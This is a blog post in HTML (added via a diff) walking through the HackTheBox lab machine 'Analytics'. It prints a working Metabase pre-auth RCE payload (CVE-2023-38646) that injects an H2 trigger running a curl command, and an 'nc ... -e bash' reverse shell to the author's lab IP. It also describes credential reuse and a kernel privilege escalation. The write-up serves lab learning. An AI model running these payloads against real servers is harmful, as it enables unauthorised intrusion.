@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Analytics - Saad Akhtar</title><meta name="Description" content="HackTheBox easy machine Analytics walkthrough."><meta property="og:title" content="HackTheBox - Analytics" />
+<meta property="og:description" content="HackTheBox easy machine Analytics walkthrough." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-analytics/" /><meta property="og:image" content="/hackthebox-analytics/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-23T07:00:21+05:00" />
+<meta property="article:modified_time" content="2024-03-23T07:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-analytics/0.png"/>
+<meta name="twitter:title" content="HackTheBox - Analytics"/>
+<meta name="twitter:description" content="HackTheBox easy machine Analytics walkthrough."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-analytics/" /><link rel="prev" href="/nahamcon2023-web/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Analytics",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-analytics\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-analytics\/0.png",
+                            "width":  1388 ,
+                            "height":  1136 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  520 ,
+        "url": "\/hackthebox-analytics\/","datePublished": "2024-03-23T07:00:21+05:00","dateModified": "2024-03-23T07:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "HackTheBox easy machine Analytics walkthrough."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Analytics</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-03-23">2024-03-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;520 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-analytics/0.png"
+        data-srcset="/hackthebox-analytics/0.png, /hackthebox-analytics/0.png 1.5x, /hackthebox-analytics/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-analytics/0.png"
+        title="HackTheBox easy machine Analytics walkthrough." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#getting-a-shell-on-host">Getting a shell on host</a>
+      <ul>
+        <li><a href="#usertxt">user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#roottxt">root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Easy machine Analytics from HackTheBox.</p>
+<h2 id="summary">Summary</h2>
+<p>Analytics involves exploitation of Pre-Auth RCE in Metabase (CVE-2023-38646) to get foothold in a docker container, getting some credentials to ssh into the host machine. Finally, exploiting a local privilege escalation vulnerability in Ubuntu Kernel (CVE-2023-32629) to get shell as root.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/ambassador<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv 10.10.11.233 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3eea454bc5d16d6fe2d4d13b0a3da94f <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 64cc75de4ae6a5b473eb3f1bcfb4e394 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://analytical.htb/
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kerne
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So we only got 22 and 80 open.</p>
+<p>We&rsquo;ll start off with port 80 web.</p>
+<p>The website redirects to <code>analytical.htb</code> and visiting the site, there seems nothing of interest but there&rsquo;s a subdomain <code>data.analytical.htb</code> link on the page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/1.png" title="page source" data-thumbnail="/hackthebox-analytics/1.png" data-sub-html="<h2>page source</h2><p>page source</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/1.png"
+            data-srcset="/hackthebox-analytics/1.png, /hackthebox-analytics/1.png 1.5x, /hackthebox-analytics/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/1.png" width="1366" height="626" />
+    </a><figcaption class="image-caption">page source</figcaption>
+    </figure></p>
+<p>The subdomain shows <code>Metabase</code> sign in page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/2.png" title="data.analytical.htb" data-thumbnail="/hackthebox-analytics/2.png" data-sub-html="<h2>data.analytical.htb</h2><p>data.analytical.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/2.png"
+            data-srcset="/hackthebox-analytics/2.png, /hackthebox-analytics/2.png 1.5x, /hackthebox-analytics/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/2.png" width="1366" height="631" />
+    </a><figcaption class="image-caption">data.analytical.htb</figcaption>
+    </figure></p>
+<p>Looking for metabase exploits, we get <code>CVE-2023-38646</code>.</p>
+<p><a href="https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396" target="_blank" rel="noopener noreffer ">This</a> shows the exploitation steps.</p>
+<h2 id="foothold">Foothold</h2>
+<p>To get RCE, we first need to make a GET request to <code>/api/session/properties</code> and extract the <code>setup-token</code> from the response.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/3.png" title="Fetching the setup-token" data-thumbnail="/hackthebox-analytics/3.png" data-sub-html="<h2>Fetching the setup token</h2><p>Fetching the setup-token</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/3.png"
+            data-srcset="/hackthebox-analytics/3.png, /hackthebox-analytics/3.png 1.5x, /hackthebox-analytics/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/3.png" width="1355" height="526" />
+    </a><figcaption class="image-caption">Fetching the setup token</figcaption>
+    </figure></p>
+<p>Then we need to call POST <code>/api/setup/validate</code> with the following body to execute a simple curl command.</p>
+<p>POST body for <code>/api/setup/validate</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;token&#34;</span><span class="p">:</span> <span class="err">&lt;setup-token&gt;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;details&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;is_on_demand&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;is_full_sync&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;is_sample&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;cache_ttl&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;refingerprint&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;auto_run_queries&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;schedules&#34;</span><span class="p">:</span> <span class="p">{},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;details&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;db&#34;</span><span class="p">:</span> <span class="s2">&#34;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#39;curl http://10.10.14.91&#39;)\n$$--=x&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;advanced-options&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;ssl&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;engine&#34;</span><span class="p">:</span> <span class="s2">&#34;h2&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice I&rsquo;m using a simple <code>curl</code> to my local python server to check for a hit.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/4.png" title="&amp;ldquo;executing curl&amp;rdquo;" data-thumbnail="/hackthebox-analytics/4.png" data-sub-html="<h2>executing curl</h2><p>&amp;ldquo;executing curl&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/4.png"
+            data-srcset="/hackthebox-analytics/4.png, /hackthebox-analytics/4.png 1.5x, /hackthebox-analytics/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/4.png" width="1354" height="521" />
+    </a><figcaption class="image-caption">executing curl</figcaption>
+    </figure></p>
+<p>And we get a successful hit on our server.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/5.png" title="&amp;ldquo;python server&amp;rdquo;" data-thumbnail="/hackthebox-analytics/5.png" data-sub-html="<h2>python server</h2><p>&amp;ldquo;python server&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/5.png"
+            data-srcset="/hackthebox-analytics/5.png, /hackthebox-analytics/5.png 1.5x, /hackthebox-analytics/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/5.png" width="560" height="96" />
+    </a><figcaption class="image-caption">python server</figcaption>
+    </figure></p>
+<p>We can simply execute a reverse shell and get the shell but for some reason normal shell payload weren&rsquo;t working here.</p>
+<p>Fortunately, a simple <code>nc 10.10.14.91 4444 -e bash</code> worked.</p>
+<p>Execute it and we&rsquo;ll get the shell as metabase.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/6.png" title="&amp;ldquo;shell as metabase&amp;rdquo;" data-thumbnail="/hackthebox-analytics/6.png" data-sub-html="<h2>shell as metabase</h2><p>&amp;ldquo;shell as metabase&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/6.png"
+            data-srcset="/hackthebox-analytics/6.png, /hackthebox-analytics/6.png 1.5x, /hackthebox-analytics/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/6.png" width="836" height="517" />
+    </a><figcaption class="image-caption">shell as metabase</figcaption>
+    </figure></p>
+<h2 id="getting-a-shell-on-host">Getting a shell on host</h2>
+<p>We&rsquo;re inside a docker container and we concluded that from our IP and also the presence of <code>.dockerenv</code> at <code>/</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/8.png" title="docker container" data-thumbnail="/hackthebox-analytics/8.png" data-sub-html="<h2>docker container</h2><p>docker container</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/8.png"
+            data-srcset="/hackthebox-analytics/8.png, /hackthebox-analytics/8.png 1.5x, /hackthebox-analytics/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/8.png" width="789" height="420" />
+    </a><figcaption class="image-caption">docker container</figcaption>
+    </figure></p>
+<p>Checking the <code>environment variables</code>, we get a password in there.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/7.png" title="env" data-thumbnail="/hackthebox-analytics/7.png" data-sub-html="<h2>env</h2><p>env</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/7.png"
+            data-srcset="/hackthebox-analytics/7.png, /hackthebox-analytics/7.png 1.5x, /hackthebox-analytics/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/7.png" width="800" height="470" />
+    </a><figcaption class="image-caption">env</figcaption>
+    </figure></p>
+<p>Trying this password for the user <code>metalytics</code> we get access to the host machine.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/9.png" title="shell as metalytics" data-thumbnail="/hackthebox-analytics/9.png" data-sub-html="<h2>shell as metalytics</h2><p>shell as metalytics</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/9.png"
+            data-srcset="/hackthebox-analytics/9.png, /hackthebox-analytics/9.png 1.5x, /hackthebox-analytics/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/9.png" width="544" height="73" />
+    </a><figcaption class="image-caption">shell as metalytics</figcaption>
+    </figure></p>
+<p>Here we get the <code>user.txt</code>.</p>
+<h3 id="usertxt">user.txt</h3>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/10.png" title="user.txt" data-thumbnail="/hackthebox-analytics/10.png" data-sub-html="<h2>user.txt</h2><p>user.txt</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/10.png"
+            data-srcset="/hackthebox-analytics/10.png, /hackthebox-analytics/10.png 1.5x, /hackthebox-analytics/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/10.png" width="667" height="261" />
+    </a><figcaption class="image-caption">user.txt</figcaption>
+    </figure></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><code>/etc/os-release</code> shows the server&rsquo;s is running <code>Ubuntu 22.04 Jammy Jellyfish</code></p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/11.png" title="/etc/os-release" data-thumbnail="/hackthebox-analytics/11.png" data-sub-html="<h2>/etc/os-release</h2><p>/etc/os-release</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/11.png"
+            data-srcset="/hackthebox-analytics/11.png, /hackthebox-analytics/11.png 1.5x, /hackthebox-analytics/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/11.png" width="749" height="232" />
+    </a><figcaption class="image-caption">/etc/os-release</figcaption>
+    </figure></p>
+<p>A quick google search and we find <code>CVE-2023-32629</code>.</p>
+<p>It&rsquo;s a privilege escalation vulnerability in Ubuntu Kernal. You can read about this vuln <a href="https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<p>As for the PoC to exploit this, I used <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" target="_blank" rel="noopener noreffer ">this</a> one.</p>
+<p>Executing the script, we get shell as root.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/12.png" title="&amp;ldquo;PE to root&amp;rdquo;" data-thumbnail="/hackthebox-analytics/12.png" data-sub-html="<h2>PE to root</h2><p>&amp;ldquo;PE to root&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/12.png"
+            data-srcset="/hackthebox-analytics/12.png, /hackthebox-analytics/12.png 1.5x, /hackthebox-analytics/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/12.png" width="498" height="149" />
+    </a><figcaption class="image-caption">PE to root</figcaption>
+    </figure></p>
+<p>And now we get the root flag.</p>
+<h3 id="roottxt">root.txt</h3>
+<p><figure><a class="lightgallery" href="/hackthebox-analytics/13.png" title="root.txt" data-thumbnail="/hackthebox-analytics/13.png" data-sub-html="<h2>root.txt</h2><p>root.txt</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-analytics/13.png"
+            data-srcset="/hackthebox-analytics/13.png, /hackthebox-analytics/13.png 1.5x, /hackthebox-analytics/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-analytics/13.png" width="571" height="307" />
+    </a><figcaption class="image-caption">root.txt</figcaption>
+    </figure></p>
+<p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-03-23</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-analytics/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-analytics/" data-title="HackTheBox - Analytics" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-analytics/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-analytics/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/nahamcon2023-web/" class="prev" rel="prev" title="NahamCon 2023 CTF - Web Challenges"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>NahamCon 2023 CTF - Web Challenges</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
